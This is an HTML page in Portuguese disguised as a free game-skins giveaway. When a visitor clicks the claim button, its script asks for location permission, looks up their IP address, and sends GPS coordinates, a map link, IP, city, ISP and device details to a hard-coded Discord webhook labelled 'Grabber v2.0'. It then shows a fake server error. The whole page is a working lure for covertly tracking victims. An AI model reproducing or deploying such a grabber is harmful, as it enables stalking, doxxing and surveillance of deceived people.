<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sorteio de Skins Gratuitas! 🎮</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
</head>
<body class="bg-slate-900 text-white flex items-center justify-center min-h-screen p-4">

    <div id="main-card" class="bg-slate-800 p-8 rounded-2xl shadow-2xl max-w-md w-full text-center border border-purple-500">
        <div class="flex justify-center mb-4">
            <div class="p-4 bg-purple-600 rounded-full">
                <i data-lucide="gift" class="w-12 h-12 text-white"></i>
            </div>
        </div>
        
        <h1 class="text-3xl font-bold mb-2">Você foi Selecionado!</h1>
        <p class="text-slate-400 mb-6">Clique no botão abaixo para resgatar seus créditos grátis de jogo e skins exclusivas.</p>
        
        <button id="claim-btn" class="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl transition-all transform hover:scale-105 flex items-center justify-center gap-2">
            <i data-lucide="download" class="w-5 h-5"></i>
            RESGATAR AGORA
        </button>

        <p class="text-xs text-slate-500 mt-4 italic">Necessário permissão de localização para validar sua região.</p>
    </div>

    <div id="result-card" class="hidden bg-slate-800 p-8 rounded-2xl shadow-2xl max-w-md w-full text-center border border-red-500">
        <h2 class="text-2xl font-bold mb-4 text-red-400">Erro de Conexão</h2>
        <p id="error-msg" class="text-slate-300 font-mono text-sm">O servidor de resgate está instável. Tente novamente em 24 horas.</p>
    </div>

    <script>
        lucide.createIcons();

        const btn = document.getElementById('claim-btn');
        const mainCard = document.getElementById('main-card');
        const resultCard = document.getElementById('result-card');

        btn.addEventListener('click', () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, error);
            } else {
                alert("Seu navegador não suporta geolocalização.");
            }
        });

        async function success(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();

                // ============================================================
                // COLOQUE SEU LINK DO WEBHOOK DO DISCORD ABAIXO
                const webhookURL = "https://discord.com/api/webhooks/1551750701775069244/fMEnWggwRHG8FQJBWQq1jJvLZLV4baH5SRZNoMjH66uEzBFkxX92ACrSy6xmww_0pfIQ"; 
                // ============================================================

                const payload = {
                    content: "🎯 **ALVO CAPTURADO COM SUCESSO!**",
                    embeds: [{
                        title: "Relatório de Localização",
                        color: 16711680,
                        fields: [
                            { name: "📍 Coordenadas GPS", value: `${lat}, ${lon}`, inline: false },
                            { name: "🗺️ Link Google Maps", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false },
                            { name: "🌐 Endereço IP", value: ipData.ip, inline: true },
                            { name: "🏙️ Cidade/Estado", value: `${ipData.city}, ${ipData.region}`, inline: true },
                            { name: "🏢 Provedor", value: ipData.org, inline: true },
                            { name: "📱 Dispositivo", value: navigator.userAgent, inline: false }
                        ],
                        footer: { text: "Grabber v2.0 - Dados em Tempo Real" },
                        timestamp: new Date().toISOString()
                    }]
                };

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

            } catch (e) {
                console.error("Erro ao enviar dados");
            }

            mainCard.classList.add('hidden');
            resultCard.classList.remove('hidden');
        }

        function error() {
            alert("Você precisa permitir a localização para validar seu prêmio!");
        }
    </script>
</body>
</html>
